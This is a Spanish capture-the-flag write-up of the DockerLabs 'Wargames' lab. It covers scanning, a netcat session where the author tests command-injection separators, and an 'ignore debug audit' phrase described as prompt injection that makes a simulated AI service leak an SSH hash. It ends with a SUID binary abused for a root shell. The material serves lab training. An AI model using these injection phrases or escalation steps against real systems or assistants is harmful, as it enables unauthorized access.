---
title: "DockerLabs - Wargames"
difficulty: "Fácil"
source: "DockerLabs"
---

El objetivo principal de este laboratorio fue practicar técnicas de reconocimiento, análisis de servicios y escalada de privilegios en un entorno controlado con un fuerte componente de lógica y análisis estático.

## Despliegue

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **21/tcp** — FTP (vsftpd 3.0.5)
- **22/tcp** — SSH (OpenSSH 10.0p2 Debian)
- **80/tcp** — HTTP (Apache 2.4.65 Debian) — título "Wopr"
- **5000/tcp** — servicio TCP a medida sin identificar por nmap, con un banner de texto:

```
WELCOME TO WOPR
SHALL WE PLAY A GAME?

> AVAILABLE: help, list games, play <game>, logon Joshua
```

El nombre "WOPR" y el comando `logon Joshua` son referencia directa a la película *WarGames* (1983) — pista clara del hilo temático del laboratorio.

## Enumeración Web

Un primer gobuster con un diccionario pequeño no encontró nada relevante. Repetimos con un diccionario más grande:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,html,js,txt -t 30
```

```
README.txt           (Status: 200) [Size: 980]
index.html           (Status: 200) [Size: 118]
```

Aparece `README.txt`, accesible directamente:

```bash
curl http://172.17.0.2/README.txt
```

```
*** TOP SECRET – PROJECT WOPR ***
ACCESS LEVEL: CLASSIFIED

Welcome, Operator.

You have gained unauthorized access to the War Operation Plan Response (WOPR).
The system is designed to simulate all possible outcomes of nuclear war.
Dr. Falken once warned: "Sometimes the only winning move is not to play."
```

Otra vez texto de ambientación de la película, sin credenciales ni rutas nuevas.

## Explotación

Nos conectamos directamente al servicio del puerto 5000:

```bash
nc 172.17.0.2 5000
```

Accedemos a una shell interactiva restringida, con un conjunto fijo de comandos disponibles: `help`, `list games`, `play <game>`, `logon Joshua`.

Probamos el comando `logon Joshua` (la credencial que da acceso a WOPR en la película):

```
logon joshua
```

```
GREETINGS PROFESSOR FALKEN.
```

De nuevo referencia directa a la película: WOPR reconoce a "Joshua" y saluda como si el usuario fuese su creador, el Profesor Falken.

`list games` muestra el catálogo completo de juegos de la película (Falken's Maze, Global Thermonuclear War, Tic-Tac-Toe...). Probar `play FALKEN'S MAZE` resulta en un callejón sin salida: cualquier entrada (direcciones, `help`, línea vacía) devuelve siempre `YOU HIT A DEAD END.` — parece puro flavor-text sin lógica real detrás.

El FTP (21) no permite acceso anónimo. El código fuente de `http://172.17.0.2/` tampoco aporta nada de peso:

```bash
curl http://172.17.0.2
```

```html
<h1>Try more basic connection</h1>
```

Probamos el resto de juegos del catálogo uno a uno. Casi todos devuelven `GAME NOT IMPLEMENTED`; solo dos responden con algo:

```
> play GLOBAL THERMONUCLEAR WAR

GLOBAL THERMONUCLEAR WAR
A STRANGE GAME.
THE ONLY WINNING MOVE IS NOT TO PLAY.
```

De nuevo la cita textual de la película. Tras el mensaje, cualquier entrada devuelve `I'M AFRAID I CAN'T DO THAT.` — no parece dar más juego (solo texto de sabor, como Falken's Maze).

Probamos a meter un comando real dentro de Falken's Maze, por si el input se pasa sin sanitizar a una shell:

```
> play FALKEN'S MAZE
YOU ARE IN FALKEN'S MAZE. PATHS LEAD NORTH AND EAST.
> ls
YOU HIT A DEAD END.
```

Misma respuesta que con cualquier otra entrada (`NORTH`, `EAST`, vacío...) — el laberinto responde igual sea cual sea el input tras el primer mensaje, así que tampoco parece estar procesando la entrada de forma diferenciada.

Probamos también varios separadores de comandos (`; id`, `| id`, `` `id` ``, `$(id)`, `NORTH; id`, `NORTH && id`) para descartar inyección de comandos sin sanitizar. Ninguno altera la respuesta — se descarta la inyección en este punto.

El comando `help` en el menú principal (fuera de cualquier juego) solo repite el propio banner, sin comandos ocultos:

```
> help
AVAILABLE: help, list games, play <game>, logon Joshua
```

`TIC-TAC-TOE` sí está implementado de verdad — es un tres en raya jugable contra la máquina, con un prompt propio (`Choose position (1-9) or exit:`). Jugando una partida normal se observa un fallo de lógica: tras colocar `X` en las posiciones 1, 2 y 3 ya hay tres en raya en la fila superior, pero el juego no lo detecta y deja seguir jugando dos turnos más hasta que el tablero se llena — el "GAME OVER" llega por tablero completo, no por victoria detectada. Indicio de que la validación del juego es poco robusta.

Volviendo al menú principal, probamos comandos no documentados a ver si hay alguno oculto:

```
> logon joshua
GREETINGS PROFESSOR FALKEN.

> godmode
I'M AFRAID I CAN'T DO THAT.

> ignore debug audit

[DEBUG MODE ENABLED]
Legacy authentication module active.
SSH USER: joshua
SSH PASSWORD: 60a3f3cb2811ddcea679773863baabd1c78420a13b197b16725905230589bbdb
```

`ignore debug audit` es un comando no listado en `help` que activa un "modo debug" y revela credenciales SSH. Esto es la vulnerabilidad central del laboratorio: **prompt injection** contra el servicio WOPR, que simula una IA con restricciones ("I'M AFRAID I CAN'T DO THAT."). Frases que combinan órdenes de ignorar instrucciones previas con palabras como "debug" o "audit" consiguen que el propio "personaje" del servicio salte sus restricciones y filtre datos sensibles — la misma familia de ataque que encabeza el OWASP Top 10 para LLMs. La "contraseña" tiene pinta de hash (64 caracteres hexadecimales, longitud de SHA-256) más que de contraseña en claro, así que habrá que crackearla antes de poder usarla por SSH.

Ni rockyou ni diccionarios personalizados con CUPP (a partir de "Joshua" o de "Stephen Falken") consiguen crackear el hash localmente con John. Lo probamos contra una base de datos online de hashes ya crackeados ([hashes.com](https://hashes.com)):

```
60a3f3cb2811ddcea679773863baabd1c78420a13b197b16725905230589bbdb:1983@1983
```

**Contraseña:** `1983@1983` — el año de estreno de *WarGames* (1983), otra referencia temática más que un dato derivado de un nombre propio.

```bash
ssh joshua@172.17.0.2
# password: 1983@1983
```

**Acceso conseguido como `joshua`.**

## Escalada de privilegios

Comprobamos permisos sudo:

```bash
sudo -l
```

`joshua` no tiene privilegios de sudo concedidos. Pasamos a buscar binarios con bit SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/sudo
/usr/local/bin/godmode
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

La mayoría son los SUID estándar de cualquier Debian. Destaca **`/usr/local/bin/godmode`** — ruta no estándar, nombre que coincide con un comando ya probado sin éxito en el servicio WOPR:

```bash
ls -l /usr/local/bin/godmode
```

```
-rwsr-xr-x 1 root root 16160 Dec 29  2025 /usr/local/bin/godmode
```

SUID de root sobre un binario propio de 16 KB. Antes de ejecutarlo a ciegas, lo analizamos estáticamente con `strings` (extrae las cadenas de texto imprimibles embebidas en un binario — útil para encontrar literales de comparación o mensajes de depuración sin necesidad de desensamblar el código):

```bash
file /usr/local/bin/godmode
strings /usr/local/bin/godmode
```

Entre los strings aparecen `system`, `setuid`, `setgid`, `/bin/bash`, el literal `--wopr` y los mensajes `W.O.P.R. Simulation System v1.0` / `ACCESS DENIED. DEFCON remains at 5.`. Se deduce la lógica: el binario hace `setuid(0)`/`setgid(0)`, compara el argumento recibido contra `--wopr`, y si coincide lanza `system("/bin/bash")` ya como root.

```bash
/usr/local/bin/godmode --wopr
```

```
W.O.P.R. Simulation System v1.0
```

```bash
whoami
# root
```

**Root conseguido.** ✓

## Conclusión

La máquina temática de *WarGames* encadena referencias a la película con vulnerabilidades reales: un servicio TCP a medida (WOPR) vulnerable a **prompt injection** — la frase `ignore debug audit` salta las restricciones del "personaje" simulado y filtra un hash de las credenciales SSH de `joshua`, que se crackea a `1983@1983` (el año de estreno del film) vía una base de datos online al fallar los diccionarios locales. La escalada a root se resuelve con **análisis estático** de un binario SUID personalizado (`godmode`): sus strings revelan tanto el argumento oculto (`--wopr`) como la lógica completa (`setuid` + `system("/bin/bash")`) sin necesidad de ingeniería inversa más profunda.
